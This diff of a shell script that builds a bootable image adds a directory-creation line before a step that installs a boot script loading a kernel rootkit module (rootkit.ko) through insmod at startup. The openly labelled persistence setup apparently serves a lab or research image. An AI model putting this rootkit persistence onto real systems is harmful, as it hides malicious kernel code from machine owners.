@@ -131,6 +131,7 @@ EOF
 grub-install --directory="$GRUB_DIR" --boot-directory="$ROOTFS_DIR/boot" "$LOOP_DEVICE"
 
 echo "Ajout d'un script de démarrage pour le rootkit..."
+mkdir -p $ROOTFS_DIR/etc/local.d
 cat <<'EOF' > "$ROOTFS_DIR/etc/local.d/rootkit.start"
 #!/bin/sh
 insmod /home/user/rootkit.ko
